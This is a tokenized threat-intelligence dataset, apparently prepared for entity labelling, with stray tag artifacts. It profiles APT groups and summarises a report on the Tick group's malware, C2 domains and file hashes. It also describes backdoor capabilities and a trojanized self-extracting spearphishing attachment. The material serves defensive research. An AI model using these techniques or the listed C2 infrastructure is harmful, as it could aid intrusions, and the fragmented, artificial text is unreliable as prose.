While
there
is
some
overlap
between
IP
addresses
used
by
O
Scarlet
Mimic
and
O
Putter
Panda
,
it
has
not
been
concluded
that
the
groups
are
the
same
.
 
Silence
is
a
financially
motivated
threat
actor
targeting
financial
institutions
in
different
countries
.
 
The
group
was
first
seen
in
June
2016
.
 
Their
main
targets
reside
in
Russia
,
Ukraine
,
Belarus
,
Azerbaijan
,
Poland
and
Kazakhstan
.
 
They
compromised
various
banking
systems
,
including
the
Russian
Central
Bank
's
Automated
Workstation
Client
,
ATMs
,
and
card
processing
.
 
Threat
Group-1314
:
TG-1314
.
 
Threat
Group-1314
is
an
unattributed
threat
group
that
has
used
compromised
credentials
to
log
into
a
victim
s
remote
access
infrastructure
.
 
Threat
Group-3390
:
TG-3390
,Emissary
Panda
,
BRONZE
UNION
,
APT27
,
Iron
Tiger
,
LuckyMouse
.
 
Threat
Group-3390
is
a
Chinese
threat
group
that
extensively
used
strategic
Web
compromises
to
target
victims
.
 
The
group
has
been
active
since
at
least
2010
and
has
targeted
organizations
in
the
aerospace
,
government
,
defense
,
technology
,O
energy
,
and
manufacturing
sectors
.
 
Thrip
is
an
espionage
group
that
has
targeted
satellite
communications
,telecoms
,and
defense
contractor
companies
in
the
U.S.
and
Southeast
Asia
.
 
The
group
uses
custom
malware
as
well
as
living
off
the
land
techniques
.
 
NEODYMIUM
is
an
activity
group
that
conducted
a
campaign
in
May
2016
and
has
heavily
targeted
Turkish
victims
.
 
The
group
has
demonstrated
similarity
to
another
activity
group
called
O
PROMETHIUM
due
to
overlapping
victim
and
campaign
characteristics
.
 
NEODYMIUM
is
reportedly
associated
closely
with
O
BlackOasis
operations
,
but
evidence
that
the
group
names
are
aliases
has
not
been
identified
.
 
Night
Dragon
is
a
campaign
name
for
activity
involving
a
threat
group
that
has
conducted
activity
originating
primarily
in
China
.
 
OilRig
:
IRN2
,
HELIX
KITTEN
,
APT34
.
 
OilRig
is
a
suspected
Iranian
threat
group
that
has
targeted
Middle
Eastern
and
international
victims
since
at
least
2014
.
 
The
group
has
targeted
a
variety
of
industries
,
including
financial
,
government
,
energy
,
chemical
,
and
telecommunications
,
and
has
largely
focused
its
operations
within
the
Middle
East
.
 
It
appears
the
group
carries
out
supply
chain
attacks
,
leveraging
the
trust
relationship
between
organizations
to
attack
their
primary
targets
.
 
FireEye
assesses
that
the
group
works
on
behalf
of
the
Iranian
government
based
on
infrastructure
details
that
contain
references
to
Iran
,
use
of
Iranian
infrastructure
,
and
targeting
that
aligns
with
nation-state
interests
.
 
This
group
was
previously
tracked
under
two
distinct
groups
,
APT34
and
OilRig
,
but
was
combined
due
to
additional
reporting
giving
higher
confidence
about
the
overlap
of
the
activity
.
 
APT16
is
a
China
based
threat
group
that
has
launched
spearphishing
campaigns
targeting
Japanese
and
Taiwanese
organizations
.
 
APT17
:
Deputy
Dog
.
 
APT17
is
a
China
based
threat
group
that
has
conducted
network
intrusions
against
U.S.
government
entities
,
the
defense
industry
,
law
firms
,
information
technology
companies
,
mining
companies
,
and
non-government
organizations
.
 
APT18
:
TG-0416
,
Dynamite
Panda
,
Threat
Group-0416
.
 
APT18
is
a
threat
group
that
has
operated
since
at
least
2009
and
has
targeted
a
range
of
industries
,
including
technology
,
manufacturing
,
human
rights
groups
,
government
,
and
medical
.
 
Group5
is
a
threat
group
with
a
suspected
Iranian
nexus
,
though
this
attribution
is
not
definite
.
 
The
group
has
targeted
individuals
connected
to
the
Syrian
opposition
via
spearphishing
and
watering
holes
,
normally
using
Syrian
and
Iranian
themes
.
 
Group5
has
used
two
commonly
available
remote
access
tools
(
RATs
)
njRAT
and
O
NanoCore
,
as
well
as
an
Android
RAT
,
DroidJack
.
 
Honeybeeis
a
campaign
led
by
an
unknown
actor
that
targets
humanitarian
aid
organizations
and
has
been
active
in
Vietnam
,
Singapore
,
Argentina
,
Japan
,
Indonesia
,
and
Canada
.
 
It
has
been
an
active
operation
since
August
of
2017
and
as
recently
as
February
2018
.
 
Group7
:
APT15
,
Mirage
,
Vixen
Panda
,
GREF
,
Playful
Dragon
,
RoyalAPT
.
 
Ke3chang
is
a
threat
group
attributed
to
actors
operating
out
of
China
.
 
Ke3chang
has
targeted
several
industries
,
including
oil
,
government
,
military
,
and
more
.
 
Kimsuky
:
Velvet
Chollima
.
 
Kimsuky
is
a
North
Korean
based
threat
group
that
has
been
active
since
at
least
September
2013
.
 
The
group
focuses
on
targeting
Korean
think
tank
as
well
as
DPRK/nuclear-related
targets
.
 
The
group
was
attributed
as
the
actor
behind
the
Korea
Hydro
&
Nuclear
Power
Co.compromise
.
 
Lazarus
Group
:
HIDDEN
COBRA
,
Guardians
of
Peace
,
ZINC
,
NICKEL
ACADEMY
.
 
Lazarus
Group
is
a
threat
group
that
has
been
attributed
to
the
North
Korean
government
.
 
The
group
has
been
active
since
at
least
2009
and
was
reportedly
responsible
for
the
November
2014
destructive
wiper
attack
against
Sony
Pictures
Entertainment
as
part
of
a
campaign
named
Operation
Blockbuster
by
Novetta
.
 
Malware
used
by
Lazarus
Group
correlates
to
other
reported
campaigns
,
including
Operation
Flame
,
Operation
1Mission
,
Operation
Troy
,
DarkSeoul
,
and
Ten
Days
of
Rain
.
 
In
late
2017
,
Lazarus
Group
used
KillDisk
,
a
disk-wiping
tool
,
in
an
attack
against
an
online
casino
based
in
Central
America
.
 
North
Korean
group
definitions
are
known
to
have
significant
overlap
,
and
the
name
Lazarus
Group
is
known
to
encompass
a
broad
range
of
activity
.
 
Some
organizations
use
the
name
Lazarus
Group
to
refer
to
any
activity
attributed
to
North
Korea
.
 
Some
organizations
track
North
Korean
clusters
or
groups
such
as
Bluenoroff
,
APT37
,
and
APT38
separately
,
while
other
organizations
may
track
some
activity
associated
with
those
group
names
by
the
name
Lazarus
Group
.
 
Leafminer
:
Raspite
.
 
Leafminer
is
an
Iranian
threat
group
that
has
targeted
government
organizations
and
business
entities
in
the
Middle
East
since
at
least
early
2017
.
 
Elderwood
:
Elderwood
Gang
,
Beijing
Group
,
Sneaky
Panda
.
 
Elderwood
is
a
suspected
Chinese
cyber
espionage
group
that
was
reportedly
responsible
for
the
2009
Google
intrusion
known
as
Operation
Aurora
.
 
The
group
has
targeted
defense
organizations
,
supply
chain
manufacturers
,
human
rights
and
nongovernmental
organizations
(
NGOs
)
,
and
IT
service
providers
.
 
Equation
is
a
sophisticated
threat
group
that
employs
multiple
remote
access
tools
.
 
The
group
is
known
to
use
zero-day
exploits
and
has
developed
the
capability
to
overwrite
the
firmware
of
hard
disk
drives
.
 
FIN10
is
a
financially
motivated
threat
group
that
has
targeted
organizations
in
North
America
since
at
least
2013
through
2016
.
 
The
group
uses
stolen
data
exfiltrated
from
victims
to
extort
organizations
.
 
Orangeworm
is
a
group
that
has
targeted
organizations
in
the
healthcare
sector
in
the
United
States
,
Europe
,
and
Asia
since
at
least
2015
,
likely
for
the
purpose
of
corporate
espionage
.
 
Patchwork
:
Dropping
Elephant
,
Chinastrats
,
MONSOON
,
Operation
Hangover
.
 
Patchwork
is
a
cyberespionage
group
that
was
first
observed
in
December
2015
.
 
While
the
group
has
not
been
definitively
attributed
,
circumstantial
evidence
suggests
the
group
may
be
a
pro-Indian
or
Indian
entity
.
 
Patchwork
has
been
seen
targeting
industries
related
to
diplomatic
and
government
agencies
.
 
Much
of
the
code
used
by
this
group
was
copied
and
pasted
from
online
forums
.
 
Patchwork
was
also
seen
operating
spearphishing
campaigns
targeting
U.S.
think
tank
groups
in
March
and
April
of
2018
.
 
PittyTiger
is
a
threat
group
believed
to
operate
out
of
China
that
uses
multiple
different
types
of
malware
to
maintain
command
and
control
.
 
Unknown
.
 
Release_Time
:
unknow
Report_URL
:
https://attack.mitre.org/groups/
APT19
Codoso
,
C0d0so0
,
Codoso
Team
,
Sunshop
Group
.
 
APT19
is
a
Chinese-based
threat
group
that
has
targeted
a
variety
of
industries
,
including
defense
,
finance
,
energy
,
pharmaceutical
,
telecommunications
,
high
tech
,
education
,
manufacturing
,
and
legal
services
.
 
In
2017
,
a
phishing
campaign
was
used
to
target
seven
law
and
investment
firms
.
 
Some
analysts
track
O
APT19
and
O
Deep
Panda
as
the
same
group
,
but
it
is
unclear
from
open
source
information
if
the
groups
are
the
same
.
 
APT28
:
SNAKEMACKEREL
,
Swallowtail
,
Group
74
,
Sednit
,
Sofacy
,
Pawn
Storm
,
Fancy
Bear
,
STRONTIUM
,
Tsar
Team
,
Threat
Group-4127
,
TG-4127
.
 
APT28
is
a
threat
group
that
has
been
attributed
to
Russia's
Main
Intelligence
Directorate
of
the
Russian
General
Staff
by
a
July
2018
U.S.
Department
of
Justice
indictment
.
 
This
group
reportedly
compromised
the
Hillary
Clinton
campaign
,
the
Democratic
National
Committee
,
and
the
Democratic
Congressional
Campaign
Committee
in
2016
in
an
attempt
to
interfere
with
the
U.S.
presidential
election
.
 
APT28
has
been
active
since
at
least
2004
.
 
APT29
:
YTTRIUM
,
The
Dukes
,
Cozy
Bear
,
CozyDuke
.
 
APT29
is
threat
group
that
has
been
attributed
to
the
Russian
government
and
has
operated
since
at
least
2008
.
 
This
group
reportedly
compromised
the
Democratic
National
Committee
starting
in
the
summer
of
2015
.
 
PLATINUM
is
an
activity
group
that
has
targeted
victims
since
at
least
2009
.
 
The
group
has
focused
on
targets
associated
with
governments
and
related
organizations
in
South
and
Southeast
Asia
.
 
Poseidon
Group
is
a
Portuguese-speaking
threat
group
that
has
been
active
since
at
least
2005
.
 
The
group
has
a
history
of
using
information
exfiltrated
from
victims
to
blackmail
victim
companies
into
contracting
the
Poseidon
Group
as
a
security
firm
.
 
PROMETHIUM
is
an
activity
group
that
has
been
active
since
at
least
2012
.
 
The
group
conducted
a
campaign
in
May
2016
and
has
heavily
targeted
Turkish
victims
.
 
PROMETHIUM
has
demonstrated
similarity
to
another
activity
group
called
NEODYMIUM
due
to
overlapping
victim
and
campaign
characteristics
.
 
APT33
O
Elfin
APT33
is
a
suspected
Iranian
threat
group
that
has
carried
out
operations
since
at
least
2013
.
 
The
group
has
targeted
organizations
across
multiple
industries
in
the
United
States
,
Saudi
Arabia
,
and
South
Korea
,
with
a
particular
interest
in
the
aviation
and
energy
sectors
.
 
APT37
O
ScarCruft
,
Reaper
,
Group123
,
TEMP.Reaper
APT37
is
a
suspected
North
Korean
cyber
espionage
group
that
has
been
active
since
at
least
2012
.
 
The
group
has
targeted
victims
primarily
in
South
Korea
,
but
also
in
Japan
,
Vietnam
,
Russia
,
Nepal
,
China
,
India
,
Romania
,
Kuwait
,
and
other
parts
of
the
Middle
East
.
 
APT37
has
also
been
linked
to
following
campaigns
between
2016-2018
:
Operation
Daybreak
,
Operation
Erebus
,
Golden
Time
,
Evil
New
Year
,
Are
you
Happy?
,
FreeMilk
,
Northern
Korean
Human
Rights
,
and
Evil
New
Year
2018
.
 
APT38
O
APT38
is
a
financially-motivated
threat
group
that
is
backed
by
the
North
Korean
regime
.
 
The
group
mainly
targets
banks
and
financial
institutions
and
has
targeted
more
than
16
organizations
in
at
least
13
countries
since
at
least
2014
.
 
APT3
:
Gothic
Panda
,
Pirpi
,
UPS
Team
,
Buckeye
,
Threat
Group-0110
,
TG-0110
.
 
APT3
is
a
China
based
threat
group
that
researchers
have
attributed
to
China's
Ministry
of
StateSecurity
.
 
This
group
is
responsible
for
the
campaigns
known
as
Operation
Clandestine
Fox
,
Operation
Clandestine
Wolf
,
and
Operation
Double
Tap
.
 
As
of
June
2015
,
the
group
appears
to
have
shifted
from
targeting
primarily
US
victims
to
primarily
political
organizations
in
Hong
Kong
.
 
MITRE
has
also
developed
an
APT3
Adversary
Emulation
Plan
.
 
APT30
is
a
threat
group
suspected
to
be
associated
with
the
Chinese
government
.
 
While
Naikon
shares
some
characteristics
with
APT30
,
the
two
groups
do
not
appear
to
be
exact
matches
.
 
APT32
:
SeaLotus
,
OceanLotus
,
APT-C-00
.
 
APT32
is
a
threat
group
that
has
been
active
since
at
least
2014
.
 
The
group
has
targeted
multiple
private
sector
industries
as
well
as
with
foreign
governments
,
dissidents
,
and
journalists
with
a
strong
focus
on
Southeast
Asian
countries
like
Vietnam
,
the
Philippines
,
Laos
,
and
Cambodia
.
 
They
have
extensively
used
strategic
web
compromises
to
compromise
victims
.
 
The
group
is
believed
to
be
Vietnam
based
.
 
FIN7
:
Carbanak
Group
.
 
FIN7
is
a
financially-motivated
threat
group
that
has
primarily
targeted
the
U.S.
retail
,
restaurant
,
and
hospitality
sectors
since
mid-2015
.
 
They
often
use
point-of-sale
malware
.
 
A
portion
of
FIN7
was
run
out
of
a
front
company
called
Combi
Security
.
 
FIN7
is
sometimes
referred
to
as
Carbanak
Group
,
but
these
appear
to
be
two
groups
using
the
same
Carbanak
malware
and
are
therefore
tracked
separately
.
 
FIN8
is
a
financially
motivated
threat
group
known
to
launch
tailored
spearphishing
campaigns
targeting
the
retail
,
restaurant
,
and
hospitality
industries
.
 
Gallmaker
is
a
cyberespionage
group
that
has
targeted
victims
in
the
Middle
East
and
has
been
active
since
at
least
December
2017
.
 
The
group
has
mainly
targeted
victims
in
the
defense
,
military
,
and
government
sectors
.
 
DarkHydrus
S-APT
is
a
threat
group
that
has
targeted
government
agencies
and
educational
institutions
in
the
Middle
East
since
at
least
2016
.
 
The
group
heavily
leverages
open-source
tools
and
custom
payloads
for
carrying
out
attacks
.
 
Deep
Panda
:
Shell
Crew
,
WebMasters
,
KungFu
Kittens
,
PinkPanther
,
Black
Vine
.
 
Deep
Panda
is
a
suspected
Chinese
threat
group
known
to
target
many
industries
,
including
government
,
defense
,
financial
,
and
telecommunications
.
 
The
intrusion
into
healthcare
company
Anthem
has
been
attributed
to
O
Deep
Panda
.
 
This
group
is
also
known
as
Shell
Crew
,
WebMasters
,
KungFu
Kittens
,
and
PinkPanther
.
 
Deep
Panda
also
appears
to
be
known
as
Black
Vine
based
on
the
attribution
of
both
group
names
to
the
Anthem
intrusion
.
 
Some
analysts
trackDeep
Panda
and
O
APT19
S-APT
as
the
same
group
,
but
it
is
unclear
from
open
source
information
if
the
groups
are
the
same
.
 
Dragonfly
:
Energetic
Bear
.
 
Dragonfly
S-APT
is
a
cyber
espionage
group
that
has
been
active
since
at
least
2011
.
 
They
initially
targeted
defense
and
aviation
companies
but
shifted
to
focus
on
the
energy
sector
in
early
2013
.
 
They
have
also
targeted
companies
related
to
industrial
control
systems
.
 
A
similar
group
emerged
in
2015
and
was
identified
by
Symantec
as
O
Dragonfly
2.0
.
 
There
is
debate
over
the
extent
of
the
overlap
between
O
Dragonfly
S-APT
and
O
Dragonfly
2.0
,
but
there
is
sufficient
evidence
to
lead
to
these
being
tracked
as
two
separate
groups
.
 
Dragonfly
2.0
:
Berserk
Bear
.
 
Dragonfly
2.0
is
a
suspected
Russian
group
that
has
targeted
government
entities
and
multiple
U.S.
critical
infrastructure
sectors
since
at
least
March
2016
.
 
There
is
debate
over
the
extent
of
overlap
between
O
Dragonfly
2.0
and
O
Dragonfly
,
but
there
is
sufficient
evidence
to
lead
to
these
being
tracked
as
two
separate
groups
.
 
DragonOK
is
a
threat
group
that
has
targeted
Japanese
organizations
with
phishing
emails
.
 
Due
to
overlapping
TTPs
,
including
similar
custom
tools
,
O
DragonOK
is
thought
to
have
a
direct
or
indirect
relationship
with
the
threat
group
O
Moafee
.
 
It
is
known
to
use
a
variety
of
malware
,
including
Sysget
/
HelloBridge
,
PlugX
,
PoisonIvy
,
FormerFirstRat
,
NFlog
,
and
NewCT
.
 
Dust
Storm
is
a
threat
group
that
has
targeted
multiple
industries
in
Japan
,
South
Korea
,
the
United
States
,
Europe
,
and
several
Southeast
Asian
countries
.
 
CopyKittens
S-APT
is
an
Iranian
cyber
espionage
group
that
has
been
operating
since
at
least
2013
.
 
It
has
targeted
countries
including
Israel
,
Saudi
Arabia
,
Turkey
,
the
U.S.
,
Jordan
,
and
Germany
.
 
Tick
Group
Continues
Attacks
.
 
The
"
Tick
"
group
has
conducted
cyber
espionage
attacks
against
organizations
in
the
Republic
of
Korea
and
Japan
for
several
years
.
 
The
group
focuses
on
companies
that
have
intellectual
property
or
sensitive
information
like
those
in
the
Defense
and
High-Tech
industries
.
 
The
group
is
known
to
use
custom
malware
called
Daserf
,
but
also
employs
multiple
commodity
and
custom
tools
,
exploit
vulnerabilities
,
and
use
social
engineering
techniques
.
 
With
multiple
tools
and
anonymous
infrastructure
,
they
are
running
longstanding
and
persistent
attack
campaigns
.
 
We
have
observed
that
the
adversary
has
repeatedly
attacked
a
high-profile
target
in
Japan
using
multiple
malware
families
for
the
last
three
years
.
 
Symantec
was
first
to
publicly
report
on
Tick
,
followed
by
LAC
in
2016
.
 
These
reports
discussed
the
group
s
malware
,
Daserf
(
a.k.a
Muirim
or
Nioupale
)
and
some
additional
downloader
programs
.
 
Though
Daserf
wasnt
a
popular
attack
tool
at
the
time
of
publishing
the
two
reports
,
it
dates
back
to
at
least
2011
.
 
Using
AutoFocus
,
we
were
able
to
identify
the
link
among
Daserf
and
two
other
threats
,
9002
and
Invader
.
 
These
threats
shared
infrastructure
between
July
2012
and
April
2013
.
 
Invader
(
a.k.a
Kickesgo
)
is
a
backdoor
that
injects
its
main
code
into
a
legitimate
process
,
such
as
explorer.exe
,
and
has
following
functions
:
Logs
keystrokes
and
mouse
movement
Captures
screenshots
Opens
cmd.exe
shell
Enumerates
processes
Executes
programs
Removes
itself
Enumerates
all
opening
TCP
and
UDP
ports
.
 
9002
is
the
infamous
RAT
frequently
seen
in
targeted
attacks
reported
by
various
security
vendors
,
including
Palo
Alto
Networks
.
 
Interestingly
,
the
C2
servers
linking
9002
to
Daserf
were
described
in
the
report
of
an
Adobe
Flash
Zero-day
attack
from
FireEye
in
2013
.
 
These
domains
were
registered
through
the
privacy
protection
services
in
2008
and
2011
.
 
krjregh.sacreeflame.com
lywja.healthsvsolu.com
.
 
Though
we
dont
know
the
targets
of
these
malware
samples
at
the
time
of
writing
this
article
,
we
suspect
the
same
group
is
behind
these
threats
for
a
number
of
reasons
.
 
The
samples
of
Daserf
that
shared
infrastructure
were
submitted
to
VirusTotal
only
from
Japan
multiple
times
in
2013
.
 
As
noted
in
a
later
section
,
another
Invader
sample
shared
different
C2
servers
with
Daserf
.
 
Symantec
reported
that
Tick
exploited
additional
Adobe
Flash
and
Microsoft
Office
vulnerabilities
.
 
SecureWorks
said
the
adversary
group
is
abusing
a
previously
undisclosed
vulnerability
in
Japanese
Software
Asset
Management
system
on
endpoints
.
 
Therefore
,
Tick
or
their
digital
quartermaster
is
capable
of
deploying
new
and
unique
exploits
.
 
In
July
2016
,
we
identified
a
compromised
website
in
Japan
that
was
hosting
a
Daserf
variant
.
 
The
web
server
was
also
a
C2
server
for
another
threat
,
Minzen
(
a.k.a
,
XXMM
,
Wali
,
or
ShadowWali
)
.
 
The
threat
often
uses
compromised
web
servers
in
Japan
and
the
Republic
of
Korea
.
 
As
Kaspersky
and
Cybereason
recently
posted
,
Minzen
is
a
modular
malware
that
has
both
32-bit
and
64-bit
components
in
its
resource
section
or
configuration
data
in
its
body
.
 
One
of
the
Minzen
samples
(
SHA256
:
9374040a9e2f47f7037edaac19f21ff1ef6a999ff98c306504f89a37196074a2
)
found
in
the
Republic
of
Korea
in
December
2016
installs
simple
backdoor
module
as
a
final
payload
on
a
compromised
computer
.
 
It
opens
a
TCP
port
and
receives
commands
from
a
remote
attacker
.
 
According
to
the
debug
path
in
the
body
,
the
author
of
the
tool
called
it
NamelessHdoor
,
and
its
internal
version
is
identified
as
V1.5.
The
payload
is
based
on
Nameless
Backdoor
which
has
been
publicly
available
for
more
than
ten
years
.
 
The
oldest
code
we
could
identify
was
hosted
on
a
famous
Chinese
source
code
sharing
site
since
2005
.
 
The
author
of
the
NamelessHdoor
appears
to
have
created
additional
versions
of
the
Nameless
Backdoor
by
removing
unnecessary
functions
,
and
added
open-source
DLL
injection
code
from
ReflectiveDLLLoader
.
 
There
is
minimal
public
information
regarding
the
Nameless
Backdoor
,
except
for
the
interesting
report
from
Cyphort
in
2015
.
 
The
researcher
of
the
company
analyzed
multiple
threats
,
including
Invader
,
Nioupale
(Daserf
)
and
Hdoor
found
in
an
attack
against
an
Asian
financial
institution
.
 
We
examined
the
sample
described
in
the
report
as
Hdoor
and
found
it
s
a
previous
version
of
the
NamelessHdoor
we
discovered
in
the
Minzen
sample
,
but
without
support
for
DLL
injection
.
 
It
turned
out
that
the
DLL
files
we
found
are
a
custom
variant
of
Gh0st
RAT
,
and
the
EXE
files
download
the
RAT
.
 
Since
the
source
code
is
publicly
available
,
Gh0st
RAT
has
been
used
by
multiple
actors
for
years
.
 
The
domain
,
softfix.co.kr
was
registered
in
2014
.
 
One
of
subdomains
,
news.softfix.co.kr
was
the
C2
server
of
Daserf
(
9c7a34390e92d4551c26a3feb5b181757b3309995acd1f92e0f63f888aa89423
)
.
 
Another
subdomain
,
bbs.softfix.co.kr
was
hosted
on
same
IP
address
as
bbs.gokickes.com
,
which
was
reported
as
the
C2
server
of
Invader
by
Cyphort
.
 
We
also
identified
www.gokickes.com
was
the
C2
of
another
Invader
variant
(
57e1d3122e6dc88d9eb2989f081de88a0e6864e767281d509ff58834928895fb
)
.
 
In
addition
to
the
infrastructure
,
the
attacker
also
shared
code
.
 
The
Gh0st
downloaders
employ
simple
substitution
ciphers
for
hiding
strings
.
 
We
also
identified
another
malware
family
,
HomamDownloader
,
sharing
some
servers
with
Daserf
.
 
An
overview
of
the
connections
among
these
threats
is
discussed
in
below
.
 
HomamDownloader
is
a
small
downloader
program
with
minimal
interesting
characteristics
from
a
technical
point
of
view
.
 
HomamDownloader
was
discovered
to
be
delivered
by
Tick
via
a
spearphishing
email
.
 
The
adversary
crafted
credible
email
and
attachment
after
understanding
the
targets
and
their
behavior
.
 
The
email
below
was
sent
from
a
personal
email
account
with
a
subject
line
of
New
Year
Wishes
on
January
1st
.
 
The
message
asked
the
recipient
to
rename
the
attachment
extension
from
._X_
to
.exe
and
opening
it
with
the
password
specified
in
the
email
to
view
the
Happy
New
Year
eCard
in
the
correct
and
polite
language
.
 
In
addition
to
the
social
engineering
email
technique
,
the
attacker
also
employs
a
trick
to
the
attachment
.
 
The
actor
embedded
malicious
code
to
a
resource
section
of
the
legitimate
SFX
file
created
by
a
file
encryption
tool
,
and
modified
the
entry
point
of
the
program
for
jumping
to
the
malicious
code
soon
after
the
SFX
program
starts
.
 
The
malicious
code
drops
HomamDownloader
,
then
jumps
back
to
the
regular
flow
in
the
CODE
section
,
which
in
turn
asks
the
user
the
password
and
decrypts
the
file
.
 
Therefore
,
once
a
user
executes
the
attachment
and
sees
the
password
dialog
on
SFX
,
the
downloader
dropped
by
the
malicious
code
starts
working
even
if
the
user
chooses
the
Cancel
on
the
password
window
.
 
Should
the
user
become
aware
of
the
infection
later
,
it
may
be
difficult
to
find
the
cause
due
to
the
fact
that
the
original
embedded
file
contained
within
the
SFX
is
benign
.
 
Tick
was
spotted
last
year
,
but
they
are
actively
and
silently
attacking
various
organizations
in
South
Korea
and
Japan
for
a
number
of
years
.
 
While
some
of
the
group
s
tools
,
tactics
,
and
procedures
(
TTPs
)
have
been
covered
within
this
article
,
it
is
likely
there
is
much
that
still
remains
uncovered
.
 
Daserf
:
04080fbab754dbf0c7529f8bbe661afef9c2cba74e3797428538ed5c243d705a
.
 
Daserf
:
f8458a0711653071bf59a3153293771a6fb5d1de9af7ea814de58f473cba9d06
.
 
Daserf
:
e8edde4519763bb6669ba99e33b4803a7655805b8c3475b49af0a49913577e51
.
 
Daserf
:
21111136d523970e27833dd2db15d7c50803d8f6f4f377d4d9602ba9fbd355cd
.
 
Daserf
:
9c7a34390e92d4551c26a3feb5b181757b3309995acd1f92e0f63f888aa89423
.
 
Invader
:
0df20ccd074b722d5fe1358b329c7bdebcd7e3902a1ca4ca8d5a98cc5ce4c287
.
 
Invader
:
e9574627349aeb7dd7f5b9f9c5ede7faa06511d7fdf98804526ca1b2e7ce127e
.
 
Invader
:
57e1d3122e6dc88d9eb2989f081de88a0e6864e767281d509ff58834928895fb
.
 
933d66b43b3ce9a572ee3127b255b4baf69d6fdd7cb24da609b52ee277baa76e
.
 
2bec20540d200758a223a7e8f7b2f98cd4949e106c1907d3f194216208c5b2fe
.
 
055fe8002de293401852310ae76cb730c570f2037c3c832a52a79b70e2cb7831
.
 
Minzen
:
797d9c00022eaa2f86ddc9374f60d7ad92128ca07204b3e2fe791c08da9ce2b1
.
 
Minzen
:
9374040a9e2f47f7037edaac19f21ff1ef6a999ff98c306504f89a37196074a2
.
 
Minzen
:
26727d139b593486237b975e7bdf93a8148c52d5fb48d5fe540a634a16a6ba82
.
 
NamelessHdoor
:
dfc8a6da93481e9dab767c8b42e2ffbcd08fb813123c91b723a6e6d70196636f
.
 
Gh0stRAt
Downloader
:
ce47e7827da145823a6f2b755975d1d2f5eda045b4c542c9b9d05544f3a9b974
.
 
Gh0stRAt
Downloader
:
e34f4a9c598ad3bb243cb39969fb9509427ff9c08e63e8811ad26b72af046f0c
.
 
Custom
Gh0st
:
8e5a0a5f733f62712b840e7f5051a2bd68508ea207e582a190c8947a06e26f40
.
 
Datper
:
7d70d659c421b50604ce3e0a1bf423ab7e54b9df361360933bac3bb852a31849
.
 
HomamDownloader
:
a624d2cd6dee3b6150df3ca61ee0f992e2d6b08b3107f5b00f8bf8bcfe07ebe7
.
 
C2
:
lywjrea.gmarketshop.net
.
 
C2
:
krjregh.sacreeflame.com
.
 
C2
:
psfir.sacreeflame.com
.
 
C2
:
lywja.healthsvsolu.com
.
 
C2
:
phot.healthsvsolu.com
.
 
C2
:
blog.softfix.co.kr
.
 
C2
:
news.softfix.co.kr
.
 
C2
:
www.gokickes.com
.
 
C2
:
log.gokickes.com
.
 
The
group
is
responsible
for
the
campaign
known
as
Operation
Wilted
Tulip
.
 
Dark
Caracal
is
threat
group
that
has
been
attributed
to
the
Lebanese
General
Directorate
of
General
Security
(
GDGS
)
and
has
operated
since
at
least
2012
.
 
Darkhotel
S-APT
is
a
threat
group
that
has
been
active
since
at
least
2004
.
 
The
group
has
conducted
activity
on
hotel
and
business
center
WiFi
and
physical
connections
as
well
as
peer-to-peer
and
file
sharing
networks
.
 
The
actors
have
also
conducted
spearphishing
.
 
Unknown
.
 
Charming
Kitten
is
an
Iranian
cyber
espionage
group
that
has
been
active
since
approximately
2014
.
 
They
appear
to
focus
on
targeting
individuals
of
interest
to
Iran
who
work
in
academic
research
,
human
rights
,
and
media
,
with
most
victims
having
been
located
in
Iran
,
the
US
,
Israel
,
and
the
UK
.
 
Charming
Kitten
usually
tries
to
access
private
email
and
Facebook
accounts
,
and
sometimes
establishes
a
foothold
on
victim
computers
as
a
secondary
objective
.
 
The
group
's
TTPs
overlap
extensively
with
another
group
,
O
Magic
Hound
,
resulting
in
reporting
that
may
not
distinguish
between
the
two
groups'
activities
.
 
Cleaver
:
Threat
Group
2889
,
TG-2889
.
 
Cleaver
is
a
threat
group
that
has
been
attributed
to
Iranian
actors
and
is
responsible
for
activity
tracked
as
Operation
Cleaver
.
 
Strong
circumstantial
evidence
suggests
Cleaver
is
linked
to
Threat
Group
2889
(
TG-2889
)
.
 
Cobalt
Group
:
Cobalt
Gang
,
Cobalt
Spider
.
 
Cobalt
Group
is
a
financially
motivated
threat
group
that
has
primarily
targeted
financial
institutions
.
 
The
group
has
conducted
intrusions
to
steal
money
via
targeting
ATM
systems
,
card
processing
,
payment
systems
and
SWIFT
systems
.
 
Cobalt
Group
has
mainly
targeted
banks
in
Eastern
Europe
,
Central
Asia
,
and
Southeast
Asia
.
 
One
of
the
alleged
leaders
was
arrested
in
Spain
in
early
2018
,
but
the
group
still
appears
to
be
active
.
 
The
group
has
been
known
to
target
organizations
in
order
to
use
their
access
to
then
compromise
additional
victims
.
 
Reporting
indicates
there
may
be
links
between
O
Cobalt
Group
and
both
the
malware
O
Carbanak
and
the
group
O
Carbanak
.
 
Taidoor
is
a
threat
group
that
has
operated
since
at
least
2009
and
has
primarily
targeted
the
Taiwanese
government
.
 
TEMP.Veles
XENOTIME
.
 
TEMP.Veles
is
a
Russia
based
threat
group
that
has
targeted
critical
infrastructure
.
 
The
group
has
been
observed
utilizing
TRITON
,
a
malware
framework
designed
to
manipulate
industrial
safety
systems
.
 
The
White
Company
is
a
likely
state-sponsored
threat
actor
with
advanced
capabilities
.
 
From
2017
through
2018
,
the
group
led
an
espionage
campaign
called
Operation
Shaheen
targeting
government
and
military
organizations
in
Pakistan
.
 
Molerats
:
Operation
Molerats
,
Gaza
Cybergang
.
 
Molerats
is
a
politically-motivated
threat
group
that
has
been
operating
since
2012
.
 
The
group
's
victims
have
primarily
been
in
the
Middle
East
,
Europe
,
and
the
United
States
.
 
MuddyWater
:
Seedworm
,
TEMP.Zagros
.
 
MuddyWater
is
an
Iranian
threat
group
that
has
primarily
targeted
Middle
Eastern
nations
,
and
has
also
targeted
European
and
North
American
nations
.
 
The
group
's
victims
are
mainly
in
the
telecommunications
,
government
(
IT
services
)
,
and
oil
sectors
.
 
Activity
from
this
group
was
previously
linked
to
FIN7
,
but
the
group
is
believed
to
be
a
distinct
group
possibly
motivated
by
espionage
.
 
Naikon
is
a
threat
group
that
has
focused
on
targets
around
the
South
China
Sea
.
 
The
group
has
been
attributed
to
the
Chinese
People
s
Liberation
Army
s
(
PLA
)
Chengdu
Military
Region
Second
Technical
Reconnaissance
Bureau
(
Military
Unit
Cover
Designator
78020
)
.
 
While
Naikon
shares
some
characteristics
with
APT30
,
the
two
groups
do
not
appear
to
be
exact
matches
.
 
APT39
:
Chafer
.
 
APT39
is
an
Iranian
cyber
espionage
group
that
has
been
active
since
at
least
2014
.
 
They
have
targeted
the
telecommunication
and
travel
industries
to
collect
personal
information
that
aligns
with
Iran
's
national
priorities
.
 
APT41
is
